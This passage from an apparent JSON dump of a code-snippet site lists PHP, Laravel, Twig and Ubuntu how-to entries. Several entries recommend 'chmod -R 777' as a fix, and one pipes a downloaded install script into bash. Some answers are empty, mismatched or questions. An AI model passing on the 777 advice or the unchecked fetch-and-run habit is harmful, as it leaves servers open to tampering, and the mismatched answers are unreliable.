    "description": "// twig if else {% if process_1 %}    {{ process_1 }} {% elseif process_2 %}    Only {{ process_2 }} left! {% else %}    Sold-out! {% endif %}\n{% if online == false %}     <p>Our website is in maintenance mode. Please, come back later.</p> {% endif %}\n{% if users %}     <ul>         {% for user in users %}             <li>{{ user.username|e }}</li>         {% endfor %}     </ul> {% endif %}\n{% if users %}     <ul>         {% for user in users %}             <li>{{ user.username|e }}</li>         {% endfor %}     </ul> {% endif %} \n{% if online == false %}     <p>Our website is in maintenance mode. Please, come back later.</p> {% endif %} \n{% if not user.subscribed %}     <p>You are not subscribed to our mailing list.</p> {% endif %}\n",
    "reg_date": "2021-10-12T10:20:40.000Z"
  },
  {
    "id": 4940,
    "keyword": null,
    "link": null,
    "title": " twig json encode",
    "description": "{{ data|json_encode() }}\n",
    "reg_date": "2021-10-12T10:20:40.000Z"
  },
  {
    "id": 4941,
    "keyword": null,
    "link": null,
    "title": " twig or",
    "description": "// twig if else {% if process_1 %}    {{ process_1 }} {% elseif process_2 %}    Only {{ process_2 }} left! {% else %}    Sold-out! {% endif %}\n{% if (a or b) %}     ... {% endif %} \n{% if online == false %}     <p>Our website is in maintenance mode. Please, come back later.</p> {% endif %}\n{% if users %}     <ul>         {% for user in users %}             <li>{{ user.username|e }}</li>         {% endfor %}     </ul> {% endif %}\n{% if online == false %}     <p>Our website is in maintenance mode. Please, come back later.</p> {% endif %} \n//For Multiple Condition {%if ( fields | length > 0 ) or ( trans_fields | length > 0 ) %}  //If statement {% if product.stock > 10 %}    Available {% elseif product.stock > 0 %}    Only {{ product.stock }} left! {% else %}    Sold-out! {% endif %}\n",
    "reg_date": "2021-10-12T10:20:40.000Z"
  },
  {
    "id": 4942,
    "keyword": null,
    "link": null,
    "title": " twig symfony get route",
    "description": "{% set current_path = app.request.get('_route') %} {{ current_path }}\n",
    "reg_date": "2021-10-12T10:20:40.000Z"
  },
  {
    "id": 4943,
    "keyword": null,
    "link": null,
    "title": " twig ternary",
    "description": "/* Twig Ternary */ {{  var == 'value1' ? 'true output' : 'false output' }} /* Twig If */ {% if var == 'value1' %} \t{{ do_this }} {% elseif var == 'value2' %} \t{{ do_this }} {% else %} \t{{ do_this }} {% endif %} /* Twig Set Var */  {% set var = 'value' %}\n{{ foo ?: 'no' }} is the same as {{ foo ? foo : 'no' }} {{ foo ? 'yes' }} is the same as {{ foo ? 'yes' : '' }} \n",
    "reg_date": "2021-10-12T10:20:41.000Z"
  },
  {
    "id": 4944,
    "keyword": null,
    "link": null,
    "title": " two condition in one laravel query",
    "description": "  public function index()     {         $search = \"Har\";            $users = User::select(\"*\")->where('status', 1)                   ->where(function($query) use ($search){                    $query->where('first_name', 'LIKE', '%'.$search.'%')                    ->orWhere('last_name', 'LIKE', '%'.$search.'%')                    ->orWhere('email', 'LIKE', '%'.$search.'%');                     })->get();            dd($users);     }  # With Join   public function index()     {         $search = \"Har\";            $users = User::select(\"*\")->where('status', 1)                   ->where(function($query) use ($search){                    $query->where('first_name', 'LIKE', '%'.$search.'%')                    ->orWhere('last_name', 'LIKE', '%'.$search.'%')                    ->orWhere('email', 'LIKE', '%'.$search.'%');                     })           ->join('users_roles', 'users.id', '=', 'users_roles.user_id')           ->where('users_roles.role_id', '=', Role::USER_PARTICIPANT)->get();            dd($users);     }\n// ... $q->where(function ($query) {     $query->where('gender', 'Male')         ->where('age', '>=', 18); })->orWhere(function($query) {     $query->where('gender', 'Female')         ->where('age', '>=', 65);\t })\n $data = Sub_sub_category::select('sub_sub_cat_name','id')->where('sub_cat_id',$request->id)->where('status','1')->get();\n",
    "reg_date": "2021-10-12T10:20:41.000Z"
  },
  {
    "id": 4945,
    "keyword": null,
    "link": null,
    "title": " two different array swap before merging in php",
    "description": "two different array swap before merging in php\n",
    "reg_date": "2021-10-12T10:20:41.000Z"
  },
  {
    "id": 4946,
    "keyword": null,
    "link": null,
    "title": " two digits after decimal point in php",
    "description": "echo round(520.34345, 2);   // 520.34 echo round(520.3, 2);       // 520.3 echo round(520, 2);         // 520 \n",
    "reg_date": "2021-10-12T10:20:41.000Z"
  },
  {
    "id": 4947,
    "keyword": null,
    "link": null,
    "title": " typeof php",
    "description": "gettype($var);\ngettype($u)\ngettype ( mixed $var ) : string  gettype (\"SALUT\") => string gettype (2) => integer       ...etc ...    \"bool\" \"integer\" \"double\" \"array\" \"object\" \"resource\" \"NULL\" \"unknown type\"\ngettype($var)\n",
    "reg_date": "2021-10-12T10:20:41.000Z"
  },
  {
    "id": 4948,
    "keyword": null,
    "link": null,
    "title": " typo3 debug",
    "description": "\\TYPO3\\CMS\\Core\\Utility\\DebugUtility::debug($var);\n\\TYPO3\\CMS\\Core\\Utility\\DebugUtility::debug($var, 'Debug: ' . __FILE__ . ' in Line: ' . __LINE__);\n",
    "reg_date": "2021-10-12T10:20:41.000Z"
  },
  {
    "id": 4949,
    "keyword": null,
    "link": null,
    "title": " typo3 fluid inline if",
    "description": "{f:if(condition: '{variable}', then: 'gesetzt', else: 'nicht-gesetzt')} \n",
    "reg_date": "2021-10-12T10:20:41.000Z"
  },
  {
    "id": 4950,
    "keyword": null,
    "link": null,
    "title": " typo3 inline if",
    "description": "{f:if(condition: '{variable}', then: 'gesetzt', else: 'nicht-gesetzt')} \n",
    "reg_date": "2021-10-12T10:20:41.000Z"
  },
  {
    "id": 4951,
    "keyword": null,
    "link": null,
    "title": " ubuntu 16 upgrade php 7.0 to 7.4",
    "description": "sudo apt-get install software-properties-common sudo add-apt-repository ppa:ondrej/php sudo apt-get update sudo apt-get upgrade sudo apt-get install -y php7.3 \nsudo apt install -y php7.4 php7.4-cli php7.4-common php7.4-fpm \nsudo apt install -y php7.4-mysql php7.4-dom php7.4-simplexml php7.4-ssh2 php7.4-xml php7.4-xmlreader php7.4-curl  php7.4-exif  php7.4-ftp php7.4-gd  php7.4-iconv php7.4-imagick php7.4-json  php7.4-mbstring php7.4-posix php7.4-sockets php7.4-tokenizer \nsudo apt-get install software-properties-common sudo add-apt-repository ppa:ondrej/php sudo apt-get update sudo apt-get upgrade sudo apt-get install -y php7.3\nsudo apt install -y php7.4-mysqli php7.4-pdo  php7.4-sqlite3 php7.4-ctype php7.4-fileinfo php7.4-zip php7.4-exif \nsudo apt-add-repository ppa:ondrej/php \n",
    "reg_date": "2021-10-12T10:20:41.000Z"
  },
  {
    "id": 4952,
    "keyword": null,
    "link": null,
    "title": " ubuntu 18.04 php is not working",
    "description": "sudo apt install php libapache2-mod-php\n",
    "reg_date": "2021-10-12T10:20:42.000Z"
  },
  {
    "id": 4953,
    "keyword": null,
    "link": null,
    "title": " ubuntu 20.04 how to install npm",
    "description": "sudo apt update sudo apt install nodejs npm\nInstall Nodejs using NVM  curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash source ~/.bashrc nvm install v14.17.1\n$ sudo apt install nodejs \n",
    "reg_date": "2021-10-12T10:20:42.000Z"
  },
  {
    "id": 4954,
    "keyword": null,
    "link": null,
    "title": " ubuntu 20.04 php-mysql",
    "description": "sudo apt install php libapache2-mod-php php-mysql \n",
    "reg_date": "2021-10-12T10:20:42.000Z"
  },
  {
    "id": 4955,
    "keyword": null,
    "link": null,
    "title": " ubuntu 20 phpmyadmin install",
    "description": "sudo apt update && sudo apt install phpmyadmin php-mbstring\n",
    "reg_date": "2021-10-12T10:20:42.000Z"
  },
  {
    "id": 4956,
    "keyword": null,
    "link": null,
    "title": " ubuntu fopen failed to open stream: Permission denied",
    "description": "$ sudo chmod -R 777 /path/to/directory \n",
    "reg_date": "2021-10-12T10:20:42.000Z"
  },
  {
    "id": 4957,
    "keyword": null,
    "link": null,
    "title": " ubuntu install php",
    "description": "# Update packages lists sudo apt update  # Install Apache2 (on Ubuntu, mostly it's already installed) sudo apt install apache2  # Install the latest version of PHP and Apache wrapper sudo apt install php libapache2-mod-php  # Install some important PHP extensions, you might need to install more later sudo apt install php-{bcmath,bz2,curl,gd,json,mbstring,mysql,xml,zip}  # Install MySQL server, and remember to run mysql_secure_installation script after that sudo apt install mysql-server  # Start MySQL service sudo systemctl start mysql  # Restart Apache service to reload all changes sudo systemctl restart apache2\n# Update packages lists sudo apt update  # Install PPA sudo add-apt-repository ppa:ondrej/php  ## If you want the latest sudo apt install php ## else sepcify version number as below sudo apt install php7.3  # Install Extensions (add php version number for specific version) sudo apt-get install php7.3-fpm php7.3 php7.3-cli php7.3-mysql php7.3-gd php7.3-imagick php7.3-recode php7.3-tidy php7.3-xmlrpc php7.3-common php7.3-curl php7.3-mbstring php7.3-xml php7.3-bcmath php7.3-bz2 php7.3-intl php7.3-json php7.3-readline php7.3-zip  # Install the latest version of PHP and Apache wrapper sudo apt install php libapache2-mod-php ## else if you installed a specific version of PHP sudo apt install php libapache2-mod-php7.3  # Enable PHP (can type sudo a2enmod php, then push tab to see listed versions) sudo a2enmod php7.3  # Restart Apache Service sudo service apache2 restart\napt-get install php-pear php-fpm php-dev php-zip php-curl php-xmlrpc php-gd php-mysql php-mbstring php-xml libapache2-mod-php\napt-get install php\nsudo apt install php libapache2-mod-php  # restart it sudo systemctl restart apache2\nsudo apt-get install php libapache2-mod-php\n",
    "reg_date": "2021-10-12T10:20:42.000Z"
  },
  {
    "id": 4958,
    "keyword": null,
    "link": null,
    "title": " ubuntu install php 7",
    "description": "# Update packages lists sudo apt update  # Install Apache2 (on Ubuntu, mostly it's already installed) sudo apt install apache2  # Install the latest version of PHP and Apache wrapper sudo apt install php libapache2-mod-php  # Install some important PHP extensions, you might need to install more later sudo apt install php-{bcmath,bz2,curl,gd,json,mbstring,mysql,xml,zip}  # Install MySQL server, and remember to run mysql_secure_installation script after that sudo apt install mysql-server  # Start MySQL service sudo systemctl start mysql  # Restart Apache service to reload all changes sudo systemctl restart apache2\nsudo apt install php7.3-cli php7.3-fpm php7.3-json php7.3-pdo php7.3-mysql php7.3-zip php7.3-gd  php7.3-mbstring php7.3-curl php7.3-xml php7.3-bcmath php7.3-json\napt-get install php-pear php-fpm php-dev php-zip php-curl php-xmlrpc php-gd php-mysql php-mbstring php-xml libapache2-mod-php\nsudo apt update sudo apt install php php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath \nsudo apt-get install php libapache2-mod-php\nsudo apt install php7.2-cli sudo apt install hhvm\n",
    "reg_date": "2021-10-12T10:20:42.000Z"
  },
  {
    "id": 4959,
    "keyword": null,
    "link": null,
    "title": " ubuntu laravel storage permission",
    "description": "cd [..LARAVEL PROJECT ROOT] sudo find . -type f -exec chmod 644 {} \\; sudo find . -type d -exec chmod 755 {} \\; sudo chmod -R 777 ./storage sudo chmod -R 777 ./bootstrap/cache/\nsudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache\n",
    "reg_date": "2021-10-12T10:20:42.000Z"
  },
  {
    "id": 4960,
    "keyword": null,
    "link": null,
    "title": " ubuntu php uninstall",
    "description": "$ sudo apt-get purge php7.* $ sudo apt-get autoclean $ sudo apt-get autoremove\nsudo apt-get remove &ndash;purge php* sudo apt-get purge php*\nsudo apt-get purge php7.* && sudo apt-get autoclean && sudo apt-get autoremove\n",
    "reg_date": "2021-10-12T10:20:42.000Z"
  },
  {
    "id": 4961,
    "keyword": null,
    "link": null,
    "title": " ubuntu restart php-fpm",
    "description": "service php-fpm restart    # typical service php5-fpm restart   # debian-style service php7.0-fpm restart # debian-style PHP 7 service php7.2-fpm restart # debian-style PHP 7.2 service php7.4-fpm restart # debian-style PHP 7.4 \nsudo /etc/init.d/php-fpm restart\n",
    "reg_date": "2021-10-12T10:20:43.000Z"
  },
  {
    "id": 4962,
    "keyword": null,
    "link": null,
    "title": " ucfirst() php",
    "description": "$foo = 'hello world!'; $foo = ucwords($foo);             // Hello World!  $bar = 'HELLO WORLD!'; $bar = ucwords($bar);             // HELLO WORLD! $bar = ucwords(strtolower($bar)); // Hello World!  //With custom delimiter $foo = 'hello|world!'; $bar = ucwords($foo);             // Hello|world!  $baz = ucwords($foo, \"|\"); \n <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?> // string manipulation function  \n",
    "reg_date": "2021-10-12T10:20:43.000Z"
  },
  {
    "id": 4963,
    "keyword": null,
    "link": null,
    "title": " ucfirst",
    "description": " <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?> // string manipulation function  \n<?php /* Convert the first character of \"hello\" to uppercase:  */ echo ucfirst(\"hello samy!\");  //output : Hello samy! ?>\n",
    "reg_date": "2021-10-12T10:20:43.000Z"
  },
  {
    "id": 4964,
    "keyword": null,
    "link": null,
    "title": " ucwords in php",
    "description": "$foo = 'hello world!'; $foo = ucwords($foo);             // Hello World!  $bar = 'HELLO WORLD!'; $bar = ucwords($bar);             // HELLO WORLD! $bar = ucwords(strtolower($bar)); // Hello World!  //With custom delimiter $foo = 'hello|world!'; $bar = ucwords($foo);             // Hello|world!  $baz = ucwords($foo, \"|\"); \n<?php /* Convert the first character of each word to uppercase: */ echo ucwords(\"hello samy, how are you ?\");  //output : Hello Samy, How Are You ? ?> \n$upperCaseSentance=ucwords(\"i do not feel good\");//I Do Not Feel Good\n$clientname = \"ankur prajapati\"; ucwords($clientname);//Ankur Prajapati ucfirst($clientname);//Ankur Prajapati  $clientname = \"ANKUR PRAJAPATI\"; ucfirst(strtolower($clientname));//Ankur Prajapati\n<?php echo ucwords(\"hello world\"); // ouput Hello World ?> \n",
    "reg_date": "2021-10-12T10:20:43.000Z"
  },
  {
    "id": 4965,
    "keyword": null,
    "link": null,
    "title": " undefined type auth",
    "description": "use Illuminate\\Support\\Facades\\Auth; \n",
    "reg_date": "2021-10-12T10:20:43.000Z"
  },
  {
    "id": 4966,
    "keyword": null,
    "link": null,
    "title": " undefined variable  session",
    "description": "<?php // add session start in your first main home page after login page // example // page1 : login.php  session_start(); $_SESSION['name']='(your data modifiable)'; .... //redirect to your main page after login // page2 : home-user.php session_start(); // now you can use if(isset($_SESSION['name']){ ?>\n",
    "reg_date": "2021-10-12T10:20:43.000Z"
  },
  {
    "id": 4967,
    "keyword": null,
    "link": null,
    "title": " uninstall php 8.0 ubuntu",
    "description": "$ sudo apt-get purge php7.*\nunistall php8\n",
    "reg_date": "2021-10-12T10:20:43.000Z"
  },
  {
    "id": 4968,
    "keyword": null,
    "link": null,
    "title": " uninstall php 8 mac",
    "description": "brew uninstall php@8.0 or brew uninstall --force php@7.3\n",
    "reg_date": "2021-10-12T10:20:43.000Z"
  },
  {
    "id": 4969,
    "keyword": null,
    "link": null,
    "title": " uninstall php mac big sur",
    "description": "$ brew uninstall --force php56 php56-apcu php56-opcache php56-xdebug php56-yaml $ brew uninstall --force php70 php70-apcu php70-opcache php70-xdebug php70-yaml $ brew uninstall --force php71 php71-apcu php71-opcache php71-xdebug php71-yaml $ brew uninstall --force php72 php72-apcu php72-opcache php72-xdebug php72-yaml $ brew cleanup\n",
    "reg_date": "2021-10-12T10:20:43.000Z"
  },
  {
    "id": 4970,
    "keyword": null,
    "link": null,
    "title": " uninstall php ubuntu 18.04",
    "description": "$ sudo apt-get purge php7.* $ sudo apt-get autoclean $ sudo apt-get autoremove\nsudo apt-get purge phpmyadmin\n",
    "reg_date": "2021-10-12T10:20:43.000Z"
  },
  {
    "id": 4971,
    "keyword": null,
    "link": null,
    "title": " uninstall phpmyadmin",
    "description": "#remove phpmyadmin #1 sudo apt-get purge phpmyadmin or sudo apt-get remove phpmyadmin #2 sudo apt-get autoremove\nsudo apt-get purge phpmyadmin\n$ sudo apt-get purge phpmyadmin\nsudo rm -r /var/lib/dpkg/info/phpmyadmin.* \\ && sudo apt-get clean \\ && sudo apt-get update \\ && sudo apt-get remove phpmyadmin \\ && sudo apt-get purge phpmyadmin  sudo apt-get update \\ sudo apt-get -f install \\ sudo apt autoremove\n",
    "reg_date": "2021-10-12T10:20:44.000Z"
  },
  {
    "id": 4972,
    "keyword": null,
    "link": null,
    "title": " uninstall phpmyadmin ubuntu",
    "description": "#remove phpmyadmin #1 sudo apt-get purge phpmyadmin or sudo apt-get remove phpmyadmin #2 sudo apt-get autoremove\nsudo apt-get purge phpmyadmin\n$ sudo apt-get purge phpmyadmin\nsudo rm -r /var/lib/dpkg/info/phpmyadmin.* \\ && sudo apt-get clean \\ && sudo apt-get update \\ && sudo apt-get remove phpmyadmin \\ && sudo apt-get purge phpmyadmin  sudo apt-get update \\ sudo apt-get -f install \\ sudo apt autoremove\n",
    "reg_date": "2021-10-12T10:20:44.000Z"
  },
  {
    "id": 4973,
    "keyword": null,
    "link": null,
    "title": " union of two arrays in php",
    "description": "$union = array_unique(array_merge($a, $b));\n",
    "reg_date": "2021-10-12T10:20:44.000Z"
  },
  {
    "id": 4974,
    "keyword": null,
    "link": null,
    "title": " unique check with multiple columns laravel validation",
    "description": "$table->unique(['mytext', 'user_id']);\n'name' => 'unique:table,field,NULL,id,field1,value1,field2,value2,field3,value3'\n'data.ip' => ['required', 'unique:servers,ip,'.$this->id.',NULL,id,hostname,'.$request->input('hostname')] \n'data.ip' => ['required', 'unique:servers,ip,'.$this->id.','.$request->input('id').',id,hostname,'.$request->input('hostname')] \n",
    "reg_date": "2021-10-12T10:20:44.000Z"
  },
  {
    "id": 4975,
    "keyword": null,
    "link": null,
    "title": " unix timestamp in php",
    "description": " <?php $date = new DateTime(); echo $date->getTimestamp(); ?>  \nstrtotime(\"now\");  // strtotime is a function that will take a string parameter  // that specifies a date, and returns a unix time stamp bassed // on that  echo strtotime(\"2020-02-24\");  // prints: 1582502400\n<?php  echo time();  ?>\n <?php $date = date_create(); echo date_timestamp_get($date); ?>  \n <?php $nextWeek = time() + (7 * 24 * 60 * 60);                    // 7 days; 24 hours; 60 mins; 60 secs echo 'Now:       '. date('Y-m-d') .\"\\n\"; echo 'Next Week: '. date('Y-m-d', $nextWeek) .\"\\n\"; // or using strtotime(): echo 'Next Week: '. date('Y-m-d', strtotime('+1 week')) .\"\\n\"; ?>  \n",
    "reg_date": "2021-10-12T10:20:44.000Z"
  },
  {
    "id": 4976,
    "keyword": null,
    "link": null,
    "title": " unlink is a directory laravel",
    "description": " $destinationPath = 'your_path';  File::delete($destinationPath.'/your_file');\n",
    "reg_date": "2021-10-12T10:20:44.000Z"
  },
  {
    "id": 4977,
    "keyword": null,
    "link": null,
    "title": " unserialize php",
    "description": "<!DOCTYPE html> <html> <body>  <?php $data = serialize(array(\"Red\", \"Green\", \"Blue\")); echo $data . \"<br>\";  $test = unserialize($data); var_dump($test); ?>  </body> </html> \n",
    "reg_date": "2021-10-12T10:20:44.000Z"
  },
  {
    "id": 4978,
    "keyword": null,
    "link": null,
    "title": " unset  post",
    "description": "unset($_POST['value']);\n",
    "reg_date": "2021-10-12T10:20:44.000Z"
  },
  {
    "id": 4979,
    "keyword": null,
    "link": null,
    "title": " unset by key name php",
    "description": "unset($dataArray['key']); \nunset($array['key-here']);\n",
    "reg_date": "2021-10-12T10:20:44.000Z"
  },
  {
    "id": 4980,
    "keyword": null,
    "link": null,
    "title": " unset session in php",
    "description": "// Destroy a sesion variable name 'variable_name'  <?php unset($_SESSION['variable_name']); ?>\nsession_destroy(); // To delete whole session // OR unset($_SESSION['myVar']); // To delete a session var\n<?php   session_start(); // start session  session_destroy();  // Delete whole session // OR unset($_SESSION['username']); // delete any specific session only ?>\nsession_unset();    //Destrol all session variables\n<?php session_destroy(); ?>  \n All of a sudden neither session_destroy() nor $_SESSION=[] were sufficient to log out. I found the next to work: <?php setcookie(session_name(), session_id(), 1); // to expire the session $_SESSION = []; ?>  \n",
    "reg_date": "2021-10-12T10:20:44.000Z"
  },
  {
    "id": 4981,
    "keyword": null,
    "link": null,
    "title": " unshift in php",
    "description": " <?php \t$a=array(\"a\"=>\"red\",\"b\"=>\"green\"); \tarray_unshift($a,\"blue\"); \tprint_r($a); // result : Array ( [0] => blue [a] => red [b] => green )  ?> \n <?php   $a=array(\"a\"=>\"red\",\"b\"=>\"green\"); array_unshift($a,\"blue\"); print_r($a);  ?>  \n",
    "reg_date": "2021-10-12T10:20:44.000Z"
  },
  {
    "id": 4982,
    "keyword": null,
    "link": null,
    "title": " unzip file php",
    "description": "$zip = new ZipArchive; $res = $zip->open('file.zip'); if ($res === TRUE) {   $zip->extractTo('/myzips/extract_path/');   $zip->close();   echo 'woot!'; } else {   echo 'doh!'; }\n(sudo) yum install zip unzip php-zip (sudo) apt install zip unzip php-zip\n",
    "reg_date": "2021-10-12T10:20:45.000Z"
  },
  {
    "id": 4983,
    "keyword": null,
    "link": null,
    "title": " update a pivot table using Eloquent",
    "description": "$user = User::find(1);  $user->roles()->updateExistingPivot($roleId, [     'active' => false, ], false);  //The last param is to not update time updated_at column timestamp.\n",
    "reg_date": "2021-10-12T10:20:45.000Z"
  },
  {
    "id": 4984,
    "keyword": null,
    "link": null,
    "title": " update all cakephp",
    "description": "$update = $this->updateAll(   \tarray(value need to update), \tarray(conditions) );  Ex: $update = $this->updateAll(   array(     'MemberLoginMethod.token' => NULL,   ),   array(     'MemberLoginMethod.member_id' => $member_id   ) );   // note: remmeber add \" with string and date   $this->MembersPush->updateAll(array(     'MembersPush.pushed' => \"\\\"\" . $date . \"\\\"\",    // update with \"\" s   ), array(     'MembersPush.device_token' => $device,  // conditions     'MembersPush.push_history_id' => $push_history_id,     'MembersPush.type' => $type,   ));\n",
    "reg_date": "2021-10-12T10:20:45.000Z"
  },
  {
    "id": 4985,
    "keyword": null,
    "link": null,
    "title": " update batch codeigniter",
    "description": "$data = array(    array(       'title' => 'My title' ,       'name' => 'My Name 2' ,       'date' => 'My date 2'    ),    array(       'title' => 'Another title' ,       'name' => 'Another Name 2' ,       'date' => 'Another date 2'    ) );  $this->db->update_batch('mytable', $data, 'title');  // Produces: // UPDATE `mytable` SET `name` = CASE // WHEN `title` = 'My title' THEN 'My Name 2' // WHEN `title` = 'Another title' THEN 'Another Name 2' // ELSE `name` END, // `date` = CASE // WHEN `title` = 'My title' THEN 'My date 2' // WHEN `title` = 'Another title' THEN 'Another date 2' // ELSE `date` END // WHERE `title` IN ('My title','Another title') \n",
    "reg_date": "2021-10-12T10:20:45.000Z"
  },
  {
    "id": 4986,
    "keyword": null,
    "link": null,
    "title": " update checkbox value in laravel",
    "description": "in controller : $shop= shop::find($request['id']); $shop->update($request->all()); In edit mode When I checkbox true work correctly but when I unchecked checkbox dose not work\n",
    "reg_date": "2021-10-12T10:20:45.000Z"
  },
  {
    "id": 4987,
    "keyword": null,
    "link": null,
    "title": " update column value laravel",
    "description": "Page::where('id', $id)->update(array('image' => 'asdasd'));\n$page = Page::find($id);  // Make sure you've got the Page model if($page) {     $page->image = 'imagepath';     $page->save(); }\n",
    "reg_date": "2021-10-12T10:20:45.000Z"
  },
  {
    "id": 4988,
    "keyword": null,
    "link": null,
    "title": " update composer php version",
    "description": "composer self-update \nphp7.3 -f /usr/local/bin/composer update\n",
    "reg_date": "2021-10-12T10:20:45.000Z"
  },
  {
    "id": 4989,
    "keyword": null,
    "link": null,
    "title": " update in codeigniter query",
    "description": "$data = array(         'title' => $title,         'name' => $name,         'date' => $date );  $this->db->where('id', $id); $this->db->update('mytable', $data); // Produces: // //      UPDATE mytable //      SET title = '{$title}', name = '{$name}', date = '{$date}' //      WHERE id = $id \npublic function update_row(){ \t\t \t\t$update_rows = array('field-name' => 'field-data',); \t\t$this->db->where('id', 1 ); \t\t$this->db->update('table-name', $update_rows);\t  \t}\t\n$this->db->select('ae_users.employee_id, ae_users.emp_name, ae_users.emp_name2, ae_users.emp_name3'); \t\t$this->db->from('ae_users');                 \t\t$this->db->where_in('ae_users.employee_id',$employee_ids);                 $this->db->_protect_identifiers = FALSE; // stop CI adding backticks                 $order = sprintf('FIELD(ae_users.employee_id, %s)', implode(', ', $employee_ids));                 $this->db->order_by($order);                 $this->db->_protect_identifiers = TRUE;  \t\t$query =$this->db->get();                // echo '<pre>'; print_r($this->db->last_query());exit; \t\tif ($query->num_rows()) { \t\t\treturn $query->result_array(); \t\t} else { \t\t\treturn 0; \t\t}\npublic function update_row(){ \t\t \t\t$update_rows = array( \t\t\t'name' => 'rincky', \t\t\t'address' => 'India', \t\t\t'contact' => '98545785', \t\t\t'department' => 'IT',  \t\t); \t\t$this->db->where('id', 1 ); \t\t$result = $this->db->update('user', $update_rows);\t \t\treturn $result; \t}\t\n$data = array(         'title' => $title,         'name' => $name,         'date' => $date );  $this->db->where('id', $id); $this->db->update('mytable', $data);\n",
    "reg_date": "2021-10-12T10:20:45.000Z"
  },
  {
    "id": 4990,
    "keyword": null,
    "link": null,
    "title": " update kali",
    "description": "apt-get update && apt-get upgrade\n",
    "reg_date": "2021-10-12T10:20:45.000Z"
  },
  {
    "id": 4991,
    "keyword": null,
    "link": null,
    "title": " update laravel",
    "description": "# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n$user = User::updateOrCreate(['name' => request()->name], [      'foo' => request()->foo ]); \nphp composer.phar update\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\nuse App\\Models\\Flight;  $flight = Flight::find(1);  $flight->name = 'Paris to London';  $flight->save();\nDB::table('vendor_managements')->where('vendor_code', $vendor_code)->update(array('state'=> $state_namne));\n",
    "reg_date": "2021-10-12T10:20:46.000Z"
  },
  {
    "id": 4992,
    "keyword": null,
    "link": null,
    "title": " update laravel version global",
    "description": "FIRST METHOD : =============== # uninstall the package composer global remove laravel/installer  # reinstall composer global require laravel/installer    SECOND METHOD :  ================    Just upgraded from Laravel 7 to 8, and running    composer global require \"laravel/installer:^4.0\"   did the trick for me (i.e., without removeing first)\nphp composer.phar update\ncomposer global require \"laravel/installer:^4.0\" \n",
    "reg_date": "2021-10-12T10:20:46.000Z"
  },
  {
    "id": 4993,
    "keyword": null,
    "link": null,
    "title": " update onlu one column laravel",
    "description": "Page::where('id', $id)->update(array('image' => 'asdasd'));  // -----or-----  $page = Page::findOrFail($id); // Make sure you've got the Page model if($page) {     $page->image = 'imagepath';     $page->save(); } \n",
    "reg_date": "2021-10-12T10:20:46.000Z"
  },
  {
    "id": 4994,
    "keyword": null,
    "link": null,
    "title": " update or create laravel",
    "description": "//if there is id => 1 for user role , update this and if there is not  //id => 1 create it and insert some data for it  $data = $request->all();    UserRule::updateOrCreate(             ['id' => 1],             $data         );\n# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n$user = User::updateOrCreate(['name' => request()->name], [      'foo' => request()->foo ]); \n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\nuse App\\Models\\Flight;  $flight = Flight::find(1);  $flight->name = 'Paris to London';  $flight->save();\n",
    "reg_date": "2021-10-12T10:20:46.000Z"
  },
  {
    "id": 4995,
    "keyword": null,
    "link": null,
    "title": " update packages composer global",
    "description": "composer self-update \ncomposer global update\n",
    "reg_date": "2021-10-12T10:20:46.000Z"
  },
  {
    "id": 4996,
    "keyword": null,
    "link": null,
    "title": " update pdo mysql php",
    "description": "$sql = \"UPDATE users SET name=?, surname=?, sex=? WHERE id=?\";$stmt= $pdo->prepare($sql);$stmt->execute([$name, $surname, $sex, $id]);\n$sql = \"UPDATE users SET name=?, surname=?, sex=? WHERE id=?\";$pdo->prepare($sql)->execute([$name, $surname, $sex, $id]);\n",
    "reg_date": "2021-10-12T10:20:46.000Z"
  },
  {
    "id": 4997,
    "keyword": null,
    "link": null,
    "title": " update php version in laravel",
    "description": "\"config\": {     \"platform\": {         \"php\": \"7.0.7\"     },     \"preferred-install\": \"dist\",     \"optimize-autoloader\": true }  run composer install\n",
    "reg_date": "2021-10-12T10:20:46.000Z"
  },
  {
    "id": 4998,
    "keyword": null,
    "link": null,
    "title": " update php version ubuntu 7.3",
    "description": "//In ubunutu Default PHP 7.1 is set on your system and you need to switch to PHP 5.6  $ sudo a2dismod php7.1 $ sudo a2enmod php5.6 $ sudo service apache2 restart    sudo update-alternatives --set php /usr/bin/php5.6\nsudo apt-get install software-properties-common sudo add-apt-repository ppa:ondrej/php sudo apt-get update sudo apt-get upgrade sudo apt-get install -y php7.3 \nsudo apt install -y php7.4 php7.4-cli php7.4-common php7.4-fpm \n",
    "reg_date": "2021-10-12T10:20:46.000Z"
  },
  {
    "id": 4999,
    "keyword": null,
    "link": null,
    "title": " update php version using htaccess",
